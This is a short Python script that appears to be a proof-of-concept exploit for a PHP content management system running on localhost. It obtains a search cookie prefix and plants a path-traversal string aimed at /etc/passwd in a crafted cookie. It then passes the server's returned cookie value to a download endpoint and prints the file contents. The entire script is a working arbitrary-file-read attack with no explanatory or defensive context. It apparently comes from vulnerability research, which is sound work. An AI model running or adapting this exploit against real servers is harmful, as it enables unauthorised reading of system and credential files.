import requests
from bs4 import BeautifulSoup as bs

url = "http://localhost:8085/"

url1 = "http://localhost:8085/index.php?f=search&modelid=0&keywords=123"

url2= url + "index.php?m=content&f=index&v=init"

cookies = {}

filepath = "wZ:/../../../../../../../../etc/passwd"

for c in requests.get(url1).cookies:
    if c.name[-13:] == "search_cookie":
        print (c.name[:3])
        cookies[c.name[:3]+'_city_key'] = filepath
        cookies["XDEBUG_SESSION"] = "PHPSTORM"

for c in requests.get(url2, cookies=cookies).cookies:
    print(c)
    if c.name[-4:] == "city":
        url3 = "http://localhost:8085/index.php?m=content&f=down&v=d&s={}".format(c.value)
        print(c.value)

print (url3)
response = requests.get(url3)

print(response.text)
